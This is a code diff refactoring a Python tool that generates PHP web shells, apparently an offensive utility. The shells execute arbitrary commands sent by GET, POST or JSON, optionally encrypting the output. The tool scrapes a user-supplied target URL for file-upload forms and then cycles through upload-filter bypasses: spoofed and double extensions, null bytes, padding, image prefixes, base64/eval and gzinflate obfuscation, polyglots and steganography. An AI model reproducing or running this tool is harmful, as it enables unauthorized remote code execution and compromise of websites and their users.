@@ -8,7 +8,11 @@ from urllib.parse import urljoin, urlparse, urlencode
 from bs4 import BeautifulSoup
 import os
 import logging
- 
+
+# Import or define ContentDiscovery from your codebase
+from content_discovery import ContentDiscovery
+
+# set up logger
 logger = logging.getLogger(__name__)
 logger.setLevel(logging.INFO)
 formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
@@ -30,228 +34,210 @@ RANDOM_COMMANDS = [
 IMAGE_FILE = 'image.jpg'
 
 def generate_random_shell(newsrst_method, custom_command=None, encryption_key=None):
+    # validate method
     if newsrst_method not in ['GET', 'POST', 'HTTP']:
-        logger.error("Invalid request method.")
+        logger.error("Invalid request method: %s", newsrst_method)
         return False
 
-    if custom_command:
-        random_command = custom_command
-    else:
-        random_command = random.choice(RANDOM_COMMANDS)
+    random_command = custom_command or random.choice(RANDOM_COMMANDS)
 
     if newsrst_method == 'GET':
-        shell_code = f"""<?php\nif (isset($_GET['cmd'])) {{\n    $cmd = $_GET['cmd'];\n    $output = shell_exec($cmd);\n    echo "<pre>$output</pre>";\n}}"""
+        shell_code = (
+            "<?php\n"
+            "if (isset($_GET['cmd'])) {\n"
+            "    $cmd = $_GET['cmd'];\n"
+            "    $output = shell_exec($cmd);\n"
+            "    echo \"<pre>$output</pre>\";\n"
+            "}\n"
+            "?>"
+        )
     elif newsrst_method == 'POST':
-        shell_code = f"""<?php\nif (isset($_POST['command'])) {{\n    $command = $_POST['command'];\n    $output = shell_exec($command);\n    echo "<pre>$output</pre>";\n}}"""
-    elif newsrst_method == 'HTTP':
-        shell_code = f"""<?php\n$request_body = file_get_contents('php://input');\n$cmd = json_decode($request_body)->cmd;\n$output = shell_exec($cmd);\nif ({encryption_key}) {{\n    $iv = random_bytes(openssl_cipher_iv_length('aes-256-cbc'));\n    $encrypted_output = openssl_encrypt($output, 'aes-256-cbc', hex2bin({encryption_key}), 0, $iv);\n    $output = base64_encode($encrypted_output . '::' . $iv);\n}}\necho json_encode(['output' => $output]);\n?>"""
+        shell_code = (
+            "<?php\n"
+            "if (isset($_POST['command'])) {\n"
+            "    $command = $_POST['command'];\n"
+            "    $output = shell_exec($command);\n"
+            "    echo \"<pre>$output</pre>\";\n"
+            "}\n"
+            "?>"
+        )
+    else:  # HTTP
+        shell_code = (
+            "<?php\n"
+            "$request_body = file_get_contents('php://input');\n"
+            "$cmd = json_decode($request_body)->cmd;\n"
+            "$output = shell_exec($cmd);\n"
+            f"if ({json.dumps(encryption_key)}) {{\n"
+            "    $iv = random_bytes(openssl_cipher_iv_length('aes-256-cbc'));\n"
+            "    $encrypted_output = openssl_encrypt($output, 'aes-256-cbc', hex2bin("
+            f"{json.dumps(encryption_key)}), 0, $iv);\n"
+            "    $output = base64_encode($encrypted_output . '::' . $iv);\n"
+            "}\n"
+            "echo json_encode(['output' => $output]);\n"
+            "?>"
+        )
 
+    # embed command if placeholder used
     shell_code = shell_code.replace('{random_command}', random_command)
 
+    # compress & encode
     base64_shell_code = base64.b64encode(shell_code.encode('utf-8'))
     compressed_shell_code = zlib.compress(base64_shell_code)
-    data_uri_scheme = f'data:image/jpeg;base64,{base64.b64encode(compressed_shell_code).decode("utf-8")}'
-    shell_code = shell_code.replace('{shell_code}', data_uri_scheme)
+    data_uri = f"data:image/jpeg;base64,{base64.b64encode(compressed_shell_code).decode('utf-8')}"
+    shell_code = shell_code.replace('{shell_code}', data_uri)
 
     return shell_code
 
 def random_shell_name():
-    return str(random.randint(11111,99999)) + '.php'
+    return f"{random.randint(11111,99999)}.php"
 
 def find_upload_point(url):
     try:
-        response = requests.get(url)
+        resp = requests.get(url, verify=True, timeout=10)
     except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to connect to {url}: {e}")
+        logger.error("Failed to connect to %s: %s", url, str(e))
         return None, None
 
-    soup = BeautifulSoup(response.text, 'html.parser')
-    forms = soup.find_all('form', {'method': ['post', 'POST']})
-    for form in forms:
-        input_tag = form.find('input', {'type': 'file'})
-        if input_tag:
-            return urljoin(url, form['action']), form.get('enctype', 'multipart/form-data')
+    if resp.status_code != 200:
+        logger.error("Non-200 response from %s: %d", url, resp.status_code)
+        return None, None
 
-    content_discovery = ContentDiscovery(url)
-    content_discovery.run()
-    for link in content_discovery.links:
+    soup = BeautifulSoup(resp.text, 'html.parser')
+    for form in soup.find_all('form', {'method': ['post', 'POST']}):
+        if form.find('input', {'type': 'file'}):
+            action = form.get('action') or url
+            enctype = form.get('enctype', 'multipart/form-data')
+            return urljoin(url, action), enctype
+
+    # fallback to content discovery
+    cd = ContentDiscovery(url)
+    cd.run()
+    for link in cd.links:
         if 'upload' in link.lower():
             try:
-                response = requests.get(link)
+                r2 = requests.get(link, verify=True, timeout=10)
             except requests.exceptions.RequestException as e:
-                logger.error(f"Failed to connect to {link}: {e}")
+                logger.error("Failed to connect to %s: %s", link, str(e))
                 continue
-            soup = BeautifulSoup(response.text, 'html.parser')
-            forms = soup.find_all('form', {'method': ['post', 'POST']})
-            for form in forms:
-                input_tag = form.find('input', {'type': 'file'})
-                if input_tag:
-                    return urljoin(url, form['action']), form.get('enctype', 'multipart/form-data')
+            if r2.status_code != 200:
+                continue
+            soup2 = BeautifulSoup(r2.text, 'html.parser')
+            for form in soup2.find_all('form', {'method': ['post', 'POST']}):
+                if form.find('input', {'type': 'file'}):
+                    action = form.get('action') or link
+                    enctype = form.get('enctype', 'multipart/form-data')
+                    return urljoin(link, action), enctype
 
     return None, None
 
 def upload_file(url, upload_point, enctype, shell_name, shell_content):
     headers = {'Content-Type': enctype}
+    methods = []
 
-    spoofed_extensions = ['jpg', 'png', 'gif', 'txt', 'doc', 'pdf']
-    for ext in spoofed_extensions:
-        files = {'file': (shell_name.rsplit('.', 1)[0] + '.' + ext, shell_content, 'application/octet-stream')}
-        files['file'].headers['Content-Disposition'] = f'form-data; name="file"; filename="{shell_name}"'
+    # helper to attempt upload
+    def attempt(name, content):
+        files = {'file': (name, content)}
         try:
-            response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
+            r = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers, verify=True, timeout=15)
         except requests.exceptions.RequestException as e:
-            logger.error(f"Failed to upload {shell_name}: {e}")
+            logger.error("Upload %s failed: %s", name, str(e))
             return None
-        if 'success' in response.text.lower():
-            return urljoin(url, shell_name)
+        if r.status_code == 200 and 'success' in r.text.lower():
+            return urljoin(url, name)
+        return None
 
-    null_byte_shell_name = shell_name + '\x00.jpg'
-    files = {'file': (null_byte_shell_name, shell_content)}
+    # 1) spoofed extensions
+    base, _ = os.path.splitext(shell_name)
+    for ext in ['jpg','png','gif','txt','doc','pdf']:
+        res = attempt(f"{base}.{ext}", shell_content)
+        if res: return res
+
+    # 2) null byte
+    res = attempt(shell_name + '\x00.jpg', shell_content)
+    if res: return res
+
+    # 3) double extension
+    res = attempt(f"{base}.jpg.php", shell_content)
+    if res: return res
+
+    # 4) large payload
+    res = attempt(shell_name, b'A'*1024*1024 + shell_content)
+    if res: return res
+
+    # 5) stego in image
+    if os.path.isfile(IMAGE_FILE):
+        with open(IMAGE_FILE,'rb') as f:
+            img = f.read()
+        res = attempt(shell_name, img + shell_content)
+        if res: return res
+
+    # 6) base64 + eval
+    b64 = base64.b64encode(shell_content).decode('utf-8')
+    res = attempt(shell_name, f"<?php eval(base64_decode('{b64}')); ?>".encode('utf-8'))
+    if res: return res
+
+    # 7) zlib + gzinflate
+    comp = zlib.compress(shell_content)
+    res = attempt(shell_name, f"<?php eval(gzinflate('{comp.hex()}')); ?>".encode('utf-8'))
+    if res: return res
+
+    # 8) pure eval
+    res = attempt(shell_name, f"<?php eval('{shell_content.decode()}'); ?>".encode('utf-8'))
+    if res: return res
+
+    # 9) data URI
+    res = attempt(shell_name, f"data:image/jpeg;base64,{b64}".encode('utf-8'))
+    if res: return res
+
+    # 10) custom ext
+    custom = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=3))
+    res = attempt(f"{base}.{custom}", shell_content)
+    if res: return res
+
+    # 11) polyglot & stego placeholders
+    # requires create_polyglot_file and hide_data_in_image functions
     try:
-        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to upload {shell_name}: {e}")
-        return None
-    if 'success' in response.text.lower():
-        return urljoin(url, shell_name)
+        poly = create_polyglot_file(shell_content)
+        res = attempt(shell_name, poly)
+        if res: return res
+    except Exception as e:
+        logger.error("Polyglot failed: %s", str(e))
 
-    double_ext_shell_name = shell_name.rsplit('.', 1)[0] + '.jpg.php'
-    files = {'file': (double_ext_shell_name, shell_content)}
     try:
-        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to upload {shell_name}: {e}")
-        return None
-    if 'success' in response.text.lower():
-        return urljoin(url, double_ext_shell_name)
+        stego = hide_data_in_image(IMAGE_FILE, shell_content)
+        res = attempt(shell_name, stego)
+        if res: return res
+    except Exception as e:
+        logger.error("Stego failed: %s", str(e))
 
-    large_shell_content = b'A' * 1024 * 1024 + shell_content
-    files = {'file': (shell_name, large_shell_content)}
-    try:
-        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to upload {shell_name}: {e}")
-        return None
-    if 'success' in response.text.lower():
-        return urljoin(url, shell_name)
-
-    if not os.path.isfile(IMAGE_FILE):
-        logger.error(f"{IMAGE_FILE} not found.")
-        return None
-    with open(IMAGE_FILE, 'rb') as f:
-        image_content = f.read()
-    image_shell_content = image_content + shell_content
-    files = {'file': (shell_name, image_shell_content)}
-    try:
-        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to upload {shell_name}: {e}")
-        return None
-    if 'success' in response.text.lower():
-        return urljoin(url, shell_name)
-
-    base64_shell_content = base64.b64encode(shell_content)
-    obfuscated_shell_content = f"eval(base64_decode('{base64_shell_content.decode('utf-8')}'));"
-    files = {'file': (shell_name, obfuscated_shell_content.encode('utf-8'))}
-    try:
-        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to upload {shell_name}: {e}")
-        return None
-    if 'success' in response.text.lower():
-        return urljoin(url, shell_name)
-
-    gzipped_shell_content = zlib.compress(shell_content)
-    obfuscated_shell_content = f"eval(gzinflate('{gzipped_shell_content.hex()}'));"
-    files = {'file': (shell_name, obfuscated_shell_content.encode('utf-8'))}
-    try:
-        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to upload {shell_name}: {e}")
-        return None
-    if 'success' in response.text.lower():
-        return urljoin(url, shell_name)
-
-    eval_shell_content = f"eval('{shell_content.decode('utf-8')}');"
-    files = {'file': (shell_name, eval_shell_content.encode('utf-8'))}
-    try:
-        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to upload {shell_name}: {e}")
-        return None
-    if 'success' in response.text.lower():
-        return urljoin(url, shell_name)
-
-    data_uri_shell_content = f"data:image/jpeg;base64,{base64_shell_content.decode('utf-8')}"
-    image_data_uri_content = image_content + data_uri_shell_content.encode('utf-8')
-    files = {'file': (shell_name, image_data_uri_content)}
-    try:
-        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to upload {shell_name}: {e}")
-        return None
-    if 'success' in response.text.lower():
-        return urljoin(url, shell_name)
-
-    custom_ext = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=3))
-    custom_shell_name = shell_name.rsplit('.', 1)[0] + '.' + custom_ext
-    files = {'file': (custom_shell_name, shell_content)}
-    try:
-        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to upload {shell_name}: {e}")
-        return None
-    if 'success' in response.text.lower():
-        return urljoin(url, custom_shell_name)
-
-    polyglot_content = create_polyglot_file(shell_content)
-    files = {'file': (shell_name, polyglot_content)}
-    try:
-        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to upload {shell_name}: {e}")
-        return None
-    if 'success' in response.text.lower():
-        return urljoin(url, shell_name)
-
-    stego_image = hide_data_in_image(IMAGE_FILE, shell_content)
-    files = {'file': (shell_name, stego_image)}
-    try:
-        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to upload {shell_name}: {e}")
-        return None
-    if 'success' in response.text.lower():
-        return urljoin(url, shell_name)
-
-    logger.error(f"Failed to upload {shell_name} using any method.")
+    logger.error("All upload methods failed for %s", shell_name)
     return None
 
 def try_upload_methods(url, shell_name, shell_content):
     upload_point, enctype = find_upload_point(url)
-    if upload_point:
-        shell_path = upload_file(url, upload_point, enctype, shell_name, shell_content)
-        if shell_path:
-            logger.info(f"Shell uploaded successfully to {shell_path}")
-        else:
-            logger.error(f"Failed to upload the shell to {url}")
+    if not upload_point:
+        logger.error("No upload point found at %s", url)
+        return None
+    path = upload_file(url, upload_point, enctype, shell_name, shell_content)
+    if path:
+        logger.info("Shell uploaded successfully: %s", path)
     else:
-        logger.error(f"Failed to find a file upload point on {url}")
-    return shell_path
+        logger.error("Failed to upload shell to %s", url)
+    return path
 
 def main():
-    url = input('Enter the target URL: ')
-    method = input('Enter the request method for the shell (GET, POST, or HTTP): ')
-    custom_command = input('Enter a custom command for the shell (optional): ')
-    encryption_key = input('Enter an encryption key for the shell communication (optional): ')
+    url = input("Enter the target URL: ").strip()
+    method = input("Enter request method (GET, POST, HTTP): ").strip().upper()
+    cmd = input("Enter custom command (optional): ").strip() or None
+    key = input("Enter encryption key (optional): ").strip() or None
 
     shell_name = random_shell_name()
-    shell_content = generate_random_shell(method, custom_command, encryption_key)
+    shell = generate_random_shell(method, cmd, key)
+    if not shell:
+        logger.error("Cannot generate shell code, invalid method.")
+        return
 
-    if shell_content:
-        shell_path = try_upload_methods(url, shell_name, shell_content.encode('utf-8'))
-    else:
-        logger.error("Invalid request method.")
+    try_upload_methods(url, shell_name, shell.encode('utf-8'))
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
